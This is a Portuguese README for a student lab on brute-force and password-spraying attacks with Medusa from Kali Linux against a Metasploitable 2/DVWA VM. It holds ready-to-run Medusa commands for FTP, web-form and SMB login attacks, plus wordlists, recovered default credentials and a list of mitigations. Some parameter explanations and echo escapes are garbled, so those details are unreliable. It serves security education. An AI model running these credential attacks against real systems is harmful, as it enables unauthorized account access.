# 🧠 Projeto: Ataques de Força Bruta com Medusa no Kali Linux

## 📋 Descrição do Projeto

Este projeto implementa, documenta e compartilha um estudo prático utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com ambientes vulneráveis — com o **Metasploitable 2**. O objetivo é simular ataques de força bruta/password spraying e descrever medidas de prevenção.

---

## 🧩 Objetivos

* Configurar o ambiente com duas VMs (Kali Linux e Metasploitable 2) em VirtualBox com rede **Host-Only**;
* Executar ataques simulados:

  * Força bruta em **FTP**;
  * Ataques a formulários web em **DVWA** (login automatizado);
  * **Password spraying** em **SMB** com enumeração de usuários;
* Documentar comandos, wordlists e resultados;
* Apresentar recomendações de mitigação e boas práticas.

---

## ⚙️ Requisitos

* VirtualBox;
* Imagens das VMs: Kali Linux e Metasploitable 2;
* Conexão entre VMs via **Host-Only**;


---

## 🔧 Preparação do Ambiente

1. Instale o VirtualBox e importe/crie as VMs (Kali e Metasploitable 2).
2. Configure a interface de rede das VMs para **Host-Only**
3. reinicie as Virtualbox:
4. login e senha da (Metasploitable 2): msfadmin
5. verifique o IP da viltualbox  (Metasploitable 2) com o comando  `IP A`
6. no terminal do (kali) coloque o comando  `ping -c 3 (coloque o IP da Metasploitable 2 aqui)`  para verificar conexão entre as Virtualbox
7. no terminal do (kali) crie duas listas que serão usadas como base para o ataque com os comando:
  ```bash
echo -e "user\msfadmin\nadmin\nroot" > users.txt
```
 ```bash
echo -e "123456\npassword\nqwerty\msfadmin" > pass.txt
```
   
---

## 💣 Testes e Comandos

### 1) Força bruta em FTP

Exemplo de comando com Medusa:

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 8
```

Parâmetros principais:

* `-h`: host alvo
* `-u`: arquivo com usuários
* `-P`: arquivo de senhas
* `-M`: módulo (ftp)
* `-t`: threads

a senha aparecerá na linha que terminará com SUCCESS

 para se conectar a outra maquina use o comando
 ```bash
ftp (coloque aqui o IP)
```

### 2) Ataque a formulário web (DVWA)

Exemplo de comando com Medusa:

```bash
 medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6
```

Parâmetros principais:

* `-h`: host alvo
* `-u`: arquivo com usuários
* `-P`: arquivo de senhas
* `-M`: módulo (http)
* `-m PAGE`: caminho do formulário de login
* `-m FORM`: threads
* `-m 'FAIL=...`: threads
* `-t 6`: threads

o user e o password aparecerá na primeira linha que terminar com SUCCESS


### 3) Password spraying em SMB

crie uma lista de user com o comando
```bash
 echo -e "user\nmsfadmin\nservice" > smb_users.txt
```
crie uma lista de password com o comando
```bash
 echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

Exemplo (medusa com módulo smbnt):

```bash
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

Parâmetros principais:
* `-h`: host alvo
* `-u`: arquivo com usuários
* `-P`: arquivo de senhas
* `-m`: módulo do Medusa (SMB NT)
* `-t`: úmero de threads (conexões) simulaneas 
* `-T`: limite total de threads que o Medusa pode usar

---

## 📜 Registro dos Testes (Exemplo)

| Teste | Serviço | Usuário  | Senha Encontrada |           Observações |
| ----- | ------- | -------- | ---------------- | --------------------: |
| 1     | FTP     | msfadmin | msfadmin         |               Sucesso |
| 2     | DVWA    | admin    | password         | Formulário vulnerável |
| 3     | SMB     | msfadmin | msfadmin         |               sucesso |

---

## 🧠 Análise e Mitigações

Recomendações gerais:

* Senhas fortes e políticas de troca periódica;
* Bloqueio/limitação de tentativas de login;
* Implementar autenticação multifator;
* Monitoramento e alertas em logs de autenticação;
* Captcha em formulários de login.

---

## 🧾 Referências

* Kali Linux — [https://www.kali.org/](https://www.kali.org/)
* Metasploitable 2 — [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

---

## ✍️ Reflexões e Aprendizados

**O que aprendi:**  
Realizei ataques de força bruta automatizados com **Medusa** (FTP, HTTP form, SMB) em VMs controladas (Kali + Metasploitable/DVWA).
Aprendi a configurar parâmetros (host, usuários, wordlists, módulos) e a interpretar respostas de login para identificar credenciais válidas.
---
**Conclusão:**  
O exercício consolidou meus conhecimentos práticos sobre ataques de autenticação e reforçou a importância de controles de defesa e monitoramento para proteger aplicações reais.
---
### Autor

* Yago Rocha — [yagokauamartinsrocha@gmail.com](yagokauamartinsrocha@gmail.com)

---

*Observação: este repositório é apenas para fins educacionais e deve ser utilizado apenas em ambientes controlados e autorizados.*
